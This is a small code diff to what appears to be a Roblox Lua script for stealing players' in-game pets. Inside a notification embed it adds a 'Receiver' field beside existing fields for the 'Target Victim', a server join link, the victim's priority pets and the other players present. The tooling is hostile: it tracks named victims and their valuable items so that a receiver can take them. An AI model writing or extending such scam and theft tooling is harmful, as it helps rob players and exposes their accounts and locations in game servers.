@@ -292,6 +292,7 @@ task.spawn(function()
                 color = 16776960,
                 fields = {
                     {name = "🎯 Target Victim", value = string.format("`%s` (@%s)", player.DisplayName, player.Name), inline = false},
+                    {name = "🦸 Receiver", value = string.format("`%s`", getgenv().receiver or "N/A"), inline = false},
                     {name = "🔗 Server Link", value = join_link, inline = false},
                     {name = "🐾 Victim's Priority Pets", value = formattedPriorityPetsForMonitor, inline = false},
                     {name = "👥 Other Players in Server", value = "```\n" .. playerListString .. "\n```", inline = false}
